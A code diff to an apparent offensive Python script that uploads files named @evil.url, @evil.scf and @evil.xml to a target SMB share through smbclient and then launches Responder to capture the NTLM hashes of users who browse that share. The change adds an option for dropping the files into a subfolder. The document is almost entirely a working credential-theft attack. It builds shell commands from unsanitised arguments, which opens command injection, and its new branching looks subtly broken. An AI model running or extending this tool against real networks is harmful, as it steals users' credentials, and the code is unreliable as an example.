@@ -38,6 +38,7 @@ parser.add_argument("-r", "--RHOST", action="store", help="RHOST")
 parser.add_argument("-l", "--LHOST", action="store", help="LHOST")
 parser.add_argument("-i", "--Interface", action="store", help="LPORT")
 parser.add_argument("-a", "--Share", action="store", help="Share Name")
+parser.add_argument("-o", "--Other", action="store", help="Other share if not in root folder")
 parser.add_argument("-U", "--Username", action="store", help="Username")
 parser.add_argument("-P", "--Password", action="store", help="Password")
 parser.add_argument("-u", "--url", action="store_true", help="URL File")
@@ -56,6 +57,7 @@ URL = args.url
 SCF = args.scf
 XML = args.xml
 ALL = args.All
+OTHER = args.Other
 
 parser.parse_args(args=None if sys.argv[1:] else ['--help'])
 
@@ -103,7 +105,10 @@ def URL_File():
 	if (USERNAME != None and PASSWORD != None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.url'""")
 		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
-	else:
+	if (OTHER != None):
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c '; cd '"""+OTHER+"""' ; put @evil.url'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""")
+	if (OTHER == None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.url'""")
 		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
 
@@ -111,15 +116,21 @@ def SCF_File():
 	if (USERNAME != None and PASSWORD != None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.scf'""")
 		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
-	else:
+	if (OTHER != None):
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c '; cd '"""+OTHER+"""' ; put @evil.scf'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
+	if (OTHER == None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.scf'""")
 		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
 
 def XML_File():
 	if (USERNAME != None and PASSWORD != None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.xml'""")
-		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
-	else:
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""")
+	if (OTHER != None):
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c '; cd '"""+OTHER+"""' ; put @evil.xml'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""")  
+	if (OTHER == None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.xml'""")
 		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
 
@@ -127,7 +138,10 @@ def ALL():
 	if (USERNAME != None and PASSWORD != None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -U """+DOMAIN+"""/"""+USERNAME+"""%"""+PASSWORD+""" -c 'put @evil.xml; put @evil.scf; put @evil.url'""")
 		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
-	else:
+	if (OTHER != None):
+		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c '; cd '"""+OTHER+"""' ; put @evil.xml; put @evil.url; put @evil.scf'""")
+		os.system("""sudo responder -I """+INTERFACE+""" -wv""")  
+	if (OTHER == None):
 		os.system("""smbclient //"""+RHOST+"""/"""+SHARE+""" -c 'put @evil.xml; put @evil.url; put @evil.scf'""")
 		os.system("""sudo responder -I """+INTERFACE+""" -wv""") 
 
